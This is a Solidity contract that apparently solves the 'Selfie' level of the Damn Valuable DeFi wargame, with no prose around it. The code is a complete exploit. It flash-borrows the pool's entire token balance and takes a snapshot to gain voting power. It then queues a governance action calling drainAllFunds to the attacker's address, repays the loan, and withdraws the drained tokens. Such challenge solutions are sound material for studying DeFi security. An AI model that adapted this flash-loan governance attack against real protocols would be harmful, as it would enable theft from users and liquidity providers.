// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";

interface IPool {
    function flashLoan(uint256 borrowAmount) external;
}

interface IGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);
}

contract SelfieExploiter {
    address private owner;
    IPool private immutable pool;
    IGovernance private immutable governance;
    DamnValuableTokenSnapshot private immutable token;

    constructor(
        address _pool,
        address _governance,
        address _token
    ) {
        owner = msg.sender;
        pool = IPool(_pool);
        governance = IGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
    }

    function work() external {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    function withdraw() external {
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function receiveTokens(address, uint256 amount) external {
        require(msg.sender == address(pool));
        token.snapshot();

        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );

        governance.queueAction(address(pool), data, 0);

        token.transfer(address(pool), amount);
    }
}
